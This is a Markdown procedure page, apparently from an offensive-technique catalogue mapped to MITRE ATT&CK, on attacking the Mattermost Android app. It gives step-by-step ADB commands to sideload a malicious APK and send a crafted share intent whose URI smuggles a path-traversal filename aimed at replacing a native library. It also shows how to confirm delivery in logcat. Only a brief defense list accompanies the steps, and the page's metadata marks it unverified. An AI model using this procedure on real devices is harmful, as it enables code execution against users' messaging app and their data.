---
id: proc-uuid-2
tags:
  - android
  - intent
  - share-activity
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:45.206Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send-Malicious-Share-Intent-to-Mattermost-ShareActivity

## Summary

This procedure launches a malicious app to send a crafted ACTION_SEND intent to the Mattermost app's exported ShareActivity, including a URI that points to a content provider serving a traversed filename and malicious payload. It exploits the app's acceptance of third-party shares without validation.

## Description

Using ADB or in-app code, create an Intent with ACTION_SEND, target com.mattermost.share.ShareActivity via setClassName, and attach the STREAM extra with a URI like content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so. Set MIME type to application/* to match the intent-filter. This triggers Mattermost to query the provider and process the share. Prerequisites: Malicious app installed, ADB access. Expected outcome: Intent delivered, leading to file processing in the next stage.

## Requirements

1. Malicious APK installed on device
2. ADB connected to device
3. Mattermost app installed
4. Permissions for intent sending

## Defense

Defensive measures and detection strategies:

- De-export ShareActivity or add permission checks
- Validate incoming intents and URIs
- Log anomalous share attempts

## Objectives

1. Deliver traversal payload via intent
2. Trigger content provider query
3. Gain access to Mattermost's file handling

## Instructions

### Step 1: Install Malicious App

**Context**: Sideload the APK to the device.

Use ADB:

```bash
adb install poc-app.apk
```

> Installs the app with EvilContentProvider.

### Step 2: Craft and Send Intent

**Context**: Create the malicious intent and start activity.

Via ADB shell am start:

```bash
am start -a android.intent.action.SEND -n com.mattermost.rn/com.mattermost.share.ShareActivity --es android.intent.extra.STREAM "content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so" -t application/*
```

> Sends the intent; adjust package if needed.

### Step 3: Verify Intent Delivery

**Context**: Check logs for processing.

Monitor with:

```bash
adb logcat | grep ShareActivity
```

> Expected: Logs show intent received and query to provider.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- android
- intent
- share-activity
